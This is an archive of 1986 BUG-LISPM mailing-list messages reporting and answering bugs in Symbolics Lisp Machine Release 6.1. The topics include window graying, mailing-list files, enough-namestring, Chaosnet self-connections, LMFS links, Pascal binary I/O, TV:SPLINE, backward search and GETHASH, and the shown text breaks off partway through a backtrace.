Warm booted from: 3600 Ethernet Receiver.

If a window with tv:gray-unused-areas-mixin has a bit-save array, and
you resize the window to be larger, the new regions are set to white.
Not only is the erase-aluf not used, but the regions are not grayed
either.  Is this a bug or a feature?
12-Apr-86 00:47:38-EST,1686;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 12 Apr 86 00:47-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 12 APR 86  00:47:06 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 28201; Sat 12-Apr-86 00:50:09-EST
Date: Sat, 12 Apr 86 00:45 EST
From: JCMA@MIT-AI.ARPA
Subject: Mailing List Recipients in Files
To: joseph@SAPSUCKER.SCRC.Symbolics.COM
cc: Bug-Lispm@MIT-REAGAN.ARPA, bug-mailer@SCRC-STONY-BROOK.ARPA,
    bug-documentation@SCRC-STONY-BROOK.ARPA
In-Reply-To: <860411091919.4.JOSEPH@HARLEM.SCRC.Symbolics.COM>
Message-ID: <860412004541.1.JCMA@MIT-MORRISON.ARPA>

    Date: Fri, 11 Apr 86 09:19  EST
    From: Joseph R Goldstone <joseph@SAPSUCKER.SCRC.Symbolics.COM>

	Date: Thu, 10 Apr 86 13:03 EST
	From: JCMA@MIT-AI.ARPA

	In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
	AISite 14.4, Experimental RELATUS 147.67, microcode TMC5-MIC 336,
	FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
	FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

	1) the document examiner returns no useful candidates for mailing list

    Thanks, we'll try and fix this.

	2) the documentation for the mailer does not tell how to make a mailing list
	definition slurp the contents of a file (e.g., COMSAT's (@FILE [JNC;CDDT
	PEOPLE]) or XMAILR'S @<filename>) to use a a recipient list.

	3) How does one specify this?

    It's not currently supported.

Barf.  Better put this into rel 7 or it will be just another instance of S
failing to implement 10 year old features (e.g., relationship of the document
examiner to info).
12-Apr-86 15:23:44-EST,2020;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 12 Apr 86 15:23-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 12 APR 86  15:22:59 EST
Received: from SCRC-STONY-BROOK.ARPA by MIT-REAGAN.ARPA via INTERNET with SMTP id 28242; 12 Apr 86 15:26:20-EST
Received: from HARLEM.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 462065; Sat 12-Apr-86 15:18:05-EST
Date: Sat, 12 Apr 86 15:17  EST
From: Joseph R Goldstone <joseph@SAPSUCKER.SCRC.Symbolics.COM>
Subject: Mailing List Recipients in Files
To: JCMA@MIT-AI.ARPA
cc: Bug-Lispm@MIT-REAGAN.ARPA, bug-mailer@SCRC-STONY-BROOK.ARPA,
    bug-documentation@SCRC-STONY-BROOK.ARPA
In-Reply-To: <860412004541.1.JCMA@MIT-MORRISON.ARPA>
Message-ID: <860412151704.2.JOSEPH@HARLEM.SCRC.Symbolics.COM>

    Date: Sat, 12 Apr 86 00:45 EST
    From: JCMA@MIT-AI.ARPA

	Date: Fri, 11 Apr 86 09:19  EST
	From: Joseph R Goldstone <joseph@SAPSUCKER.SCRC.Symbolics.COM>

	    Date: Thu, 10 Apr 86 13:03 EST
	    From: JCMA@MIT-AI.ARPA

	    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
	    AISite 14.4, Experimental RELATUS 147.67, microcode TMC5-MIC 336,
	    FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
	    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

	    1) the document examiner returns no useful candidates for mailing list

	Thanks, we'll try and fix this.

	    2) the documentation for the mailer does not tell how to make a mailing list
	    definition slurp the contents of a file (e.g., COMSAT's (@FILE [JNC;CDDT
	    PEOPLE]) or XMAILR'S @<filename>) to use a a recipient list.

	    3) How does one specify this?

	It's not currently supported.

    Barf.  Better put this into rel 7 or it will be just another instance of S
    failing to implement 10 year old features (e.g., relationship of the document
    examiner to info).

I will file your courteous request for a future release.  Thank you.

15-Apr-86 11:57:58-EST,2642;000000000000
Received: from HILBERT.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 15 Apr 86 11:57-EST
Date: Tue, 15 Apr 86 11:58 EST
From: Patrick A. O'Donnell <PAO@EECS.MIT.EDU>
Subject: enough-namestring doesn't return enough.
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860415115806.1.PAO@HILBERT.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.5, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine David Hilbert:

(setf test (pathname "PIG:USRD$:[PAO.LISPM]GRAPHICS.LSP"))
#P"PIG:USRD$:[PAO.LISPM]GRAPHICS.LSP"

(setf defaults (file-namestring test))
"GRAPHICS.LSP"

(setf enuf (enough-namestring test defaults))
"USRD$:[PAO.LISPM]"

(merge-pathnames enuf defaults)

>>Error: #"USRD$" is not a known file server host.
While in the function FS:GET-PATHNAME-HOST  FS:PARSE-PATHNAME-FIND-COLON  FS:PARSE-PATHNAME

FS:GET-PATHNAME-HOST:  (P.C. = 56)
   Arg 0 (FS:HOST-NAME): #"USRD$"
   --Defaulted args:--
   Arg 1 (FS:NO-ERROR-P): NIL
   Arg 2 (FS:NO-AUTO-ADD-P): NIL
   Local 3 (FS:HOST): NIL

FS:PARSE-PATHNAME-FIND-COLON:  (P.C. = 31)
   Arg 0 (ZL:STRING): #"USRD$:[PAO.LISPM]"

FS:PARSE-PATHNAME:  (P.C. = 251)
   Arg 0 (FS:THING): #"USRD$:[PAO.LISPM]"
   Arg 1 (FS:WITH-RESPECT-TO): NIL
   Arg 2 (FS:DEFAULTS): #P"PIG:GRAPHICS.LSP"

PARSE-NAMESTRING:  (P.C. = 104)
   Arg 0 (SCL::THING): "USRD$:[PAO.LISPM]"
   Local 0 (SCL::THING): #"USRD$:[PAO.LISPM]"
   Arg 1 (SCL::HOST): NIL
   Arg 2 (SCL::DEFAULTS): #P"PIG:GRAPHICS.LSP"
   Rest arg: NIL

MERGE-PATHNAMES:  (P.C. = 13)
   Arg 0 (PATHNAME): "USRD$:[PAO.LISPM]"
   Arg 1 (SCL::DEFAULTS): "GRAPHICS.LSP"
   Local 1 (SCL::DEFAULTS): #P"PIG:GRAPHICS.LSP"
   --Defaulted args:--
   Arg 2 (SCL::DEFAULT-VERSION): :NEWEST

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (MERGE-PATHNAMES * (FILE-NAMESTRING UL:TEST))
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 74300101>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 74300106>

Rest of stack:
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:LISP-COMMAND-LOOP:  (P.C. = 67)
SI:COMMON-LISP-TOP-LEVEL:  (P.C. = 46)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
15-Apr-86 15:36:03-EST,1819;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 15 Apr 86 15:35-EST
Received: from VAIL.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 33022; Tue 15-Apr-86 15:34:18-EST
Date: Tue, 15 Apr 86 15:34 EST
From: Andrew Braunstein <asb@MIT-ZERMATT.ARPA>
Subject: Bug with CHAOS (???) code
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860415153408.1.ASB@VAIL.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.13, MLSite 13.0,
Experimental DVI 1.1, Experimental Schema 109.0, Experimental XML 2.0,
microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Vail:

;; the following program illustrates a bug in the chaos code (???) that occurs
;; when a machine opens a stream to itself.  The system works fine up
;; until it tries
;; to close the stream at which point, the net hangs (both are waiting on a
;; chaos-finish).  The reason that this bug was discovered and
;; why anyone would want to connect to the same host was that I am developing
;; a Remote Procedure Call (RPC) mechanism and it facilitated the debugging to
;; use the local host as both ends of the system.  

(net:define-protocol :chaos-bug (:chaos-bug :byte-stream))
(chaos:add-contact-name-for-protocol :chaos-bug)

;; just a dummy-server
(net:define-server :chaos-bug (:medium :byte-stream :stream dummy-stream))

;; dummy program to invoke server and then close stream and leave
(defun show-chaos-bug ()
  (format t "~%I am about to start~%")
  (with-open-stream
    (chaos-stream (chaos:open-stream 
		   net:*local-host*
		   "chaos-bug"))
    (format t "I am working~%"))
  (format t "I am now finished~%"))
15-Apr-86 16:40:34-EST,2921;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 15 Apr 86 16:40-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM (ALLEGHENY.SCRC) by MIT-ZERMATT.ARPA via INTERNET with SMTP id 33043; 15 Apr 86 16:38:59-EST
Received: from FIREBIRD.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 12331; Tue 15-Apr-86 16:33:35-EST
Date: Tue, 15 Apr 86 16:30  EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: Bug with CHAOS (???) code
To: Andrew Braunstein <asb@MIT-ZERMATT.ARPA>, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860415153408.1.ASB@VAIL.LCS.MIT.EDU>
Message-ID: <860415163053.5.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Tue, 15 Apr 86 15:34 EST
    From: Andrew Braunstein <asb@MIT-ZERMATT.ARPA>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
    FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.13, MLSite 13.0,
    Experimental DVI 1.1, Experimental Schema 109.0, Experimental XML 2.0,
    microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>V127-LISP.FLOD(2),
    FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
    FEP0:>V127-DEBUG.FLOD(1), on Vail:

    ;; the following program illustrates a bug in the chaos code (???) that occurs
    ;; when a machine opens a stream to itself.  The system works fine up
    ;; until it tries
    ;; to close the stream at which point, the net hangs (both are waiting on a
    ;; chaos-finish).  The reason that this bug was discovered and
    ;; why anyone would want to connect to the same host was that I am developing
    ;; a Remote Procedure Call (RPC) mechanism and it facilitated the debugging to
    ;; use the local host as both ends of the system.  

    (net:define-protocol :chaos-bug (:chaos-bug :byte-stream))
    (chaos:add-contact-name-for-protocol :chaos-bug)

    ;; just a dummy-server
    (net:define-server :chaos-bug (:medium :byte-stream :stream dummy-stream))

    ;; dummy program to invoke server and then close stream and leave
    (defun show-chaos-bug ()
      (format t "~%I am about to start~%")
      (with-open-stream
	(chaos-stream (chaos:open-stream 
		       net:*local-host*
		       "chaos-bug"))
	(format t "I am working~%"))
      (format t "I am now finished~%"))

Chaosnet does not have a symmetric close protocol.  Closing a connection
normally sends an EOF and waits for it to be ACKed.  Since both sides
are doing this, there is nobody reading the ACK since they are both
waiting.  You have to define a non-symmetric close protocol.  Usually
the server is the more forgiving.  For example, the user can close
normally, but the server, when it closes should close in :ABORT mode.
If the protocol requires synchronous closing, you have to get more
elaborate.  Look at the chaosnet documentation (perhaps the original
ones of 5 years ago) and see how the MAIL protocol works with its
multiple EOFing.

15-Apr-86 17:27:51-EST,857;000000000000
Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 15 Apr 86 17:24-EST
Date: Tue 15 Apr 86 17:20:05-EST
From: Ken Traub <KT@XX.LCS.MIT.EDU>
Subject: LMFS links
To: bug-lispm@OZ.AI.MIT.EDU
cc: heller@XX.LCS.MIT.EDU
Message-ID: <12199114995.67.KT@XX.LCS.MIT.EDU>

Is there any way of redirecting a link so that it has a new target?  For
example, if there is a link named A which points to B, and I'd like A to
point to C instead, is there an easy to make this happen?  The only way
I can think of so far is to remove the delete transparency from A (if it
existed), delete link A, expunge A's directory, and create a new link
from A to C.  This is not only a big pain, but has the undesirable side-
effect of expunging A's directory.  LMFS won't let me simply change
the :LINK-TO property of A.

I appreciate any response.
-------
15-Apr-86 17:50:43-EST,1702;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 15 Apr 86 17:46-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU 15 Apr 86 17:45:06 EST
Received: from SORA.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 464455; Tue 15-Apr-86 17:35:59-EST
Date: Tue, 15 Apr 86 17:32  EST
From: Bernard S. Greenberg <BSG@SCRC-STONY-BROOK.ARPA>
Subject: LMFS links
To: KT@XX.LCS.MIT.EDU, bug-lispm@OZ.AI.MIT.EDU
cc: heller@XX.LCS.MIT.EDU, bug-lmfs@SCRC-STONY-BROOK.ARPA
In-Reply-To: <12199114995.67.KT@XX.LCS.MIT.EDU>
Message-ID: <860415173235.8.BSG@SORA.SCRC.Symbolics.COM>

    Date: Tue 15 Apr 86 17:20:05-EST
    From: Ken Traub <KT@XX.LCS.MIT.EDU>
[bug-lmfs added]
    Is there any way of redirecting a link so that it has a new target?  For
    example, if there is a link named A which points to B, and I'd like A to
    point to C instead, is there an easy to make this happen?  The only way
    I can think of so far is to remove the delete transparency from A (if it
    existed), delete link A, expunge A's directory, and create a new link
    from A to C.  This is not only a big pain, but has the undesirable side-
    effect of expunging A's directory.  LMFS won't let me simply change
    the :LINK-TO property of A.

    I appreciate any response.
    -------
It's true, you can't.  You can certainly strip the transparencies, rename
it, and make a new one and delete the old, which is even more of a pain
but works without needing to expunge. 

Also, if the version number of the link is not important, you can
just supersede it if it's not create-through.

Your idea is a good one, though, and easy enough to implement.

17-Apr-86 14:45:21-EST,2257;000000000000
Received: from BUDDY.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 17 Apr 86 14:44-EST
Date: Thu, 17 Apr 86 14:44 EST
From: James J. Little <LITTLE@OZ.AI.MIT.EDU>
Subject: Pascal I/O
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860417144417.1.LITTLE@BUDDY.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.6, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0, COLOR 135.50,
COLOR-EXTENSIONS 4.6, COLOR-EDITOR 4.1, COLOR-DEMO 68.7,
COLOR-PALETTE 2.1, IMAGES 56.21, MENU 6.1, Paint (DS) 5.0,
Dynamics (DS) 6.0, Render (DS) 10.0, Geometry (DS) 6.0,
Livwin (DS) 268.0, Tablet (DS) 2.0, microcode TMC5-COL-MIC 353, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Buddy Holly:

Trying to write out 16-bit binary quantities, as follows:

1,8,16,16, then packing 8-bit 1 and 2, 3 and 4 into 16-bit hunks, it
translated every 8-bit element using character translation.   This is an
od -c on the resulting file:

0000000  001  \0 210  \0 020  \0 020  \0 001 002 003 004 005 006 007 210
0000020  211 212 213 214 215 016 017 020 001 002 003 004 005 006 007 210
*
0000410

It shouldn't perform this translation.  How do we tell it "NO!"?




{ -*- mode: pascal; dialect: vs; package: user; fonts: cptfont,cptfontb,cptfonti -*- }

program testio(input,output);

const imsize = 16;

type vals = 1..5000;
     bit8 = 0..255;
     bit16 = 0..65535;
  hunka = record 
    case boolean of
      true:
	     (chars     :   packed array[1..2] of  bit8);
      false: (thing           :   bit16);
end;

var IMGFLE : file of bit16;
    outn: string;
    i,j    : integer;
    ahunk  : hunka;

begin
      writeln(' the output file name ');
      readln(outn);
      writeln(outn);
      rewrite(IMGFLE,'name=hermes:/u/little/' || outn);
      
      write(imgfle,1);
      write(imgfle,1+7);
      write(imgfle,16);
      write(imgfle,16);
      for j := imsize downto 1 do
      begin
	    i:= 1;
	    while (i <= imsize) do 
	     begin;
		   ahunk.chars[1] := i;
		   ahunk.chars[2] := i+1;
		   write(IMGFLE, ahunk.thing);
		   i:=i+2;
	     end;
       end;  (* writeing to the image file *)
end.

18-Apr-86 10:30:22-EST,1102;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 18 Apr 86 10:30-EST
Received: from MIT-XX.ARPA by MIT-ZERMATT.ARPA via INTERNET with SMTP id 33726; 18 Apr 86 10:29:57-EST
Received: from KILLINGTON.LCS.MIT.EDU by XX.LCS.MIT.EDU with TCP; Fri 18 Apr 86 10:27:37-EST
Date: Fri, 18 Apr 86 10:29 EST
From: Robert Scheifler <RWS@MIT-ZERMATT.ARPA>
Subject: bug in TV:SPLINE
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860418102946.1.RWS@KILLINGTON.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.13, MLSite 13.2,
Experimental DVI 1.1, Experimental Schema 110.0, Experimental XML 2.0,
microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Killington:

Why does TV:SPLINE return the active length of CX instead of the
length actually used?  Although the caller can pass in CX and CY
arrays, the caller can't reuse those arrays in calls to TV:SPLINE
without first fillarray'ing them with NIL.

20-Apr-86 20:06:29-EST,2844;000000000000
Received: from SID.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 20 Apr 86 20:06-EST
Date: Sun, 20 Apr 86 20:05 EST
From: Jonathan A Rees <JAR@MIT-MC.ARPA>
Subject: Backwards FSM search does not work, please complain nicely to BUG-LISPM
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860420200535.8.JAR@SID.AI.MIT.EDU>

In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.6, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Sid Vicious:


This is a nice complaint to BUG-LISPM.  I use string search (never
I-search).  I tried doing a reverse delimited search and it didn't work.
It would be nice if it did.

- Jonathan



>>Error: Backwards FSM search does not work, please complain nicely to BUG-LISPM
While in the function ZWEI:FSM-SEARCH  ZWEI:DELIMITED-SEARCH  ZWEI:COM-STRING-SEARCH-INTERNAL

ZWEI:FSM-SEARCH:  (P.C. = 30)
   Arg 0 (ZWEI:BP): ("  (with-open-file (*standard-output* /"z:>jar>temp.tex/" :direction :out)" 58 :NORMAL)
   Arg 1 (ZWEI:STRINGS): (#<ART-16B-5 37412410>)
   Arg 2 (ZWEI:REVERSE-P): T
   Arg 3 (ZWEI:FIXUP-P): NIL
   Arg 4 (IGNORE): NIL
   Arg 5 (ZWEI:LIMIT-BP): NIL
   Local 5 (ZWEI:LIMIT-BP): (";;; -*- Syntax: Common-lisp; Package: USER -*-" 0 :NORMAL)
   --Defaulted args:--
   Arg 6 (ZWEI:STATE): 0
   Local 7 (ZWEI:WORD): NIL

ZWEI:DELIMITED-SEARCH:  (P.C. = 70)
   Arg 0 (ZWEI:BP): ("  (with-open-file (*standard-output* /"z:>jar>temp.tex/" :direction :out)" 58 :NORMAL)
   Arg 1 (ZL:STRING): "rec"
   Local 1 (ZL:STRING): (#<ART-16B-5 37412410>)
   Arg 2 (ZWEI:REVERSE-P): T
   --Defaulted args:--
   Arg 3 (ZWEI:FIXUP-P): NIL
   Arg 4 (ZWEI:LIMIT-BP): NIL
   Arg 5: NIL

ZWEI:COM-STRING-SEARCH-INTERNAL:  (P.C. = 423)
   Arg 0 (ZWEI:REVERSEP): T
   Arg 1 (ZWEI:BJP): NIL
   Arg 2 (ZWEI:ZJP): NIL
   Arg 3 (ZWEI:TOP-P): NIL

ZWEI:CHAR-SEARCH-INTERNAL:  (P.C. = 146)
   Arg 0 (ZWEI:REVERSEP): T

ZWEI:COM-REVERSE-CHAR-SEARCH:  (P.C. = 4)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-REVERSE-CHAR-SEARCH
   Arg 1 (ZWEI:CHAR): 338
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): NIL

ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
   Arg 0 (ZWEI:CH): 338

(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:EDITOR -- 12. IV's, 0. FL's 120377766>
   Arg 2 (SI:OPERATION): :EDIT
   --Defaulted args:--
   Arg 3 (ZWEI:TOP-LEVEL-P): T
   Arg 4 (ZWEI:DESCRIPTION): NIL

Rest of stack:
(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
25-Apr-86 18:48:52-EST,525;000000000000
Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Apr 86 18:48-EST
Date: Fri 25 Apr 86 09:20:58-EST
From: Ken Traub <KT@XX.LCS.MIT.EDU>
Subject: Bug in Common Lisp GETHASH
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <12201649213.28.KT@XX.LCS.MIT.EDU>

While running Release 6.1:

According to the Common Lisp Manual, page 284, GETHASH is supposed to return
two values, the second indicating whether or not the key was actually present.
Symbolics' GETHASH returns only one value.

				--- Ken
-------
25-Apr-86 22:06:12-EST,50899;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Apr 86 22:05-EST
Received: from ELVIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 29613; Wed 23-Apr-86 09:37:54-EST
Date: Wed, 23 Apr 86 09:37 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: huh?
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860423093703.1.ZVONA@ELVIS.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.6, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Elvis Presley:

I got this with Sys F Tree Edit Any sys: *; *.*.*.

>>Error: The object #<LOGICAL-PATHNAME "SYS: sys; site; *.*.*"> received a :DIRECTORY-PATHNAME-AS-FILE message, which went unclaimed.
         The rest of the message was ()
While in the function (:METHOD TV:DIRECTORY-TREE :AFTER :INIT)  (:METHOD TV:DIRECTORY-TREE :COMBINED :INIT)  INSTANTIATE-FLAVOR

(:METHOD TV:DIRECTORY-TREE :AFTER :INIT):  (P.C. = 64)
   Arg 0 (SELF): #<DIRECTORY-TREE 25642137>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TV:DIRECTORY-TREE -- 9. IV's, 1. FL's 171066350>
   Arg 2 (SI:OPERATION): :INIT
   Arg 3 (IGNORE): #<DTP-LOCATIVE 73500624>

(:METHOD TV:DIRECTORY-TREE :COMBINED :INIT):  (P.C. = 11)
   Arg 0 (SELF): #<DIRECTORY-TREE 25642137>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TV:DIRECTORY-TREE -- 9. IV's, 1. FL's 171066350>
   Arg 2 (SI:.OPERATION.): :INIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<DTP-LOCATIVE 73500624>)

INSTANTIATE-FLAVOR:  (P.C. = 445)
   Arg 0 (SI:FLAVOR-NAME): TV:DIRECTORY-TREE
   Arg 1 (SI:INIT-PLIST): #<DTP-LOCATIVE 73500624>
   Arg 2 (SI:SEND-INIT-MESSAGE-P): :MAYBE
   --Defaulted args:--
   Arg 3 (SI:RETURN-UNHANDLED-KEYWORDS-P): NIL
   Arg 4 (SI:AREA-TO-CONS-INSTANCE-IN): NIL

MAKE-INSTANCE:  (P.C. = 6)
   Arg 0 (SI:FLAVOR-NAME): TV:DIRECTORY-TREE
   Rest arg (SI:INIT-OPTIONS): (:SUPERIOR #<DIRECTORY-TREE 25642124> :DIR-IN-DIR-FORM #<LOGICAL-PATHNAME "SYS: sys; site; *.*.*">)

TV:COLLECT-FSEDIT-RECURSIVE-WILD-DIRECTORY-NODE:  (P.C. = 21)
   Arg 0 (TV:ROOT-NODE): #<DIRECTORY-TREE 25642124>
   Arg 1 (TV:PATH): #<LOGICAL-PATHNAME "SYS: *; *.*.*">
   Arg 2 (TV:DESCRIPTION): (("sys" "site"))
   Arg 3 (TV:ALIST): ((("sys" "r6" "doc") (#<LMFS-PATHNAME "B:>sys>r6>doc>zmacs.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715306764 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>doc.lisp.33"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2715312215 :MODIFICATION-DATE 2715312215 :CREATION-DATE 2700230603 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>sage.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312216 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>rn6.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312220 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>rn6-1.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312237 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>nota.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312256 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>user.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312261 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>lms.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312271 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>doc>ined.directory.1"> :DIRECTORY T :LENGTH-IN-BLOCKS 1 :NOT-BACKED-UP T :CREATION-DATE 2715312277 :AUTHOR ...) ...) (("sys" "r6" "l-fep") (#<LMFS-PATHNAME "B:>sys>r6>l-fep>philips-io4.sync.1"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310033 :MODIFICATION-DATE 2715310033 :CREATION-DATE 2677444385 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>philips-io2.sync.1"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310035 :MODIFICATION-DATE 2715310035 :CREATION-DATE 2677444384 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>moniterm-io4.sync.4"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310036 :MODIFICATION-DATE 2715310036 :CREATION-DATE 2660167554 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>l-fep>moniterm-io2.sync.4"> :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2715310038 :MODIFICATION-DATE 2715310038 :CREATION-DATE 2660168030 :AUTHOR ...) (#<LMFS-PATHNAME 